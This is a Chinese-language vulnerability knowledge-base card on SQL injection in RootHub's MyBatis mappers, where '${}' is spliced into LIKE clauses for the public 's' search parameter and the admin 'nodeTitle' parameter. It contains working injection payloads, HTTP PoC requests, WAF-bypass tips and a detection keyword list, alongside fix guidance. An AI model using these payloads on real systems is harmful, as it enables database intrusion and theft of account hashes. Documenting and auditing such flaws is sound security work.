---
id: web-generic-sqli-roothub-mybatis-like-dollar-brace
title: RootHub MyBatis LIKE 拼接注入：搜索 s 与后台 nodeTitle 两处 ${}
type: scenario
domain: web
path: web/generic/sqli
technique: roothub-mybatis-like-dollar-brace
tags:
- java
- mybatis
- sqli
- like
- dollar-brace
- roothub
- web
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:28:16+08:00'
  notes: 已对照原文与图04-10核对：TopicDao.xml selectByLike 为 where title like '%${like}%'（图05），TopicServiceImpl.pageLike 调 rootTopicDao.selectByLike（图06），/search GET 的 @RequestParam("s") 传入 pageLike（图07）；listForAdmin 为 AND a.node_title LIKE '%${nodeTitle}%'（图08），pageForAdmin 调 nodeDao.listForAdmin（图09），/list GET 带 @RequiresPermissions("node:list") 接收 nodeTitle（图10）。两处 ${} LIKE 拼接注入链路成立。未验证点/需注意：原文未附注入请求或回显，confidence=medium 合理；原文未明确数据库类型，卡内“原文项目使用 MySQL”及 PoC 的 extractvalue 属推断（MyBatis ${} 注入本身与数据库无关，按目标库调整 payload）；原文未显示 /search 所在控制器类名，卡内“CommonController#search”为推断。PoC 未本机执行。原文未给版本，未设置 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-roothub-mybatis-like-dollar-brace/
draft: false
kb_aliases:
- RootHub SQL 注入
- TopicDao selectByLike 注入
- nodeTitle 注入
- s 参数 SQL 注入
- MyBatis LIKE ${} 注入
---

## 一句话结论

RootHub 的 MyBatis Mapper 在 LIKE 条件中使用 `'%${like}%'` 与 `'%${nodeTitle}%'` 文本替换，用户输入 `s`/`nodeTitle` 直接进入 SQL 语法层；搜索接口与后台节点列表均可注入，可做联合/报错/布尔盲注。

## 原理

- **`${}` 不是参数绑定**：MyBatis 的 `#{}` 生成 `PreparedStatement` 的 `?`，`${}` 在 SQL 解析前做纯文本替换；放在 `LIKE '%${x}%'` 中时，输入里的单引号、`AND`、`UNION`、注释符都会成为 SQL 一部分。
- **注入点 1（前台搜索）**：`TopicDao.xml` 的 `selectByLike`：
  ```sql
  where title like '%${like}%'
  ```
  `TopicServiceImpl.pageLike(pageNumber, pageSize, like)` 调用 `rootTopicDao.selectByLike(like, ...)`；`CommonController#search`（`/search` GET）接收 `@RequestParam("s") String search` 并传入 `pageLike`。因此 `s` 可控且无白名单。
- **注入点 2（后台节点列表）**：Node Mapper 的 `listForAdmin`：
  ```sql
  AND a.node_title LIKE '%${nodeTitle}%'
  ```
  `NodeService.pageForAdmin(nodeTitle, pageNumber, pageSize)` → `nodeDao.listForAdmin`；Controller `/list` GET 接收 `nodeTitle`（带 `@RequiresPermissions("node:list")`，需后台权限）并传给 `pageForAdmin`。
- **为什么成立**：LIKE 的 `%...%` 只是把输入包在通配符里，不能阻止引号逃逸；`${}` 又把输入原样拼进 XML 生成的 SQL，预编译完全缺失。
- **原文验证边界**：文章通过全局搜 `${` 和调用链定位到两处，未附注入请求/回显截图；本卡按代码与参数链路判定，confidence 定为 medium。

## 触发条件

- 目标部署 RootHub，`/search`（前台）或后台 `/list` 路由可达。
- Mapper 使用 `${}` 且 `s`/`nodeTitle` 未被 Controller/Service 做白名单、转义或长度截断。
- 数据库为 MySQL 等支持注释符/报错函数的类型（原文项目使用 MySQL）。
- 注入点 2 需要具备 `node:list` 权限的后台账号；注入点 1 通常前台可达。

## 利用步骤

1. 前台搜索：`GET /search?s=<payload>&p=1`，用 `s='` 触发 SQL 报错/500，确认注入。
2. 布尔/联合：`s=%' AND 1=1-- -` 与 `s=%' AND 1=2-- -` 比较结果差异；列数匹配后用 `UNION SELECT ...` 回显。
3. 报错注入（MySQL）：`s=%' AND extractvalue(1,concat(0x7e,database()))-- -`。
4. 后台：登录后 `GET /list?nodeTitle=<payload>&p=1`，同样以 `%'` 闭合 LIKE 再做布尔/报错注入。
5. 按需提取表名、账号哈希、配置项；若 WAF 拦截关键字，可用注释、大小写、编码或 `/**/` 绕过。

## PoC

前台搜索（`s`）：

```http
GET /search?s=%25%27%20AND%20extractvalue(1,concat(0x7e,database()))--%20-&p=1 HTTP/1.1
Host: target
```

后台节点列表（`nodeTitle`，需 `node:list` 权限）：

```http
GET /list?nodeTitle=%25%27%20AND%201=1--%20-&p=1 HTTP/1.1
Host: target
Cookie: <后台会话>
```

对应 SQL 片段：

```xml
where title like '%${like}%'
AND a.node_title LIKE '%${nodeTitle}%'
```

## 变体与关联

- **注入位置变体**：同一项目其他 Mapper 若也存在 `%${...}%`、`${...}`（ORDER BY、IN、表名），可用相同方法注入；审计时可全局搜 `${`。
- **盲注/报错/联合**：按回显条件选择；LIKE 上下文需先闭合 `%'`，常用 `%' AND ...-- -`。
- **权限差异**：前台 `s` 通常无需登录，后台 `nodeTitle` 需要 `node:list`；拿到低权限后台账号即可利用后者。
- **关联**：MyBatis `${}` 五类拼接点通用卡、LIKE 子句注入、JDBC 拼接注入审计；根因相同，差异只在具体路由与参数。

## 检测与防御

- **修复**：将 `${}` 改为 `#{}`，LIKE 使用 `CONCAT('%', #{like}, '%')` 或 `LIKE #{like}` 并在 Java 侧拼接 `%`；表名/排序等标识符位置用白名单映射。
- **检测**：请求参数出现 `%'`、`--`、`extractvalue`、`updatexml`、`union select`、`sleep(` 等；同一 IP 高频请求 `/search`、`/list` 并观察响应差异；数据库日志出现拼接后的异常 SQL。
- **防御**：最小权限数据库账号、关闭详细报错、WAF 拦截常见注入特征（不能替代预编译）；对后台接口做权限与审计。
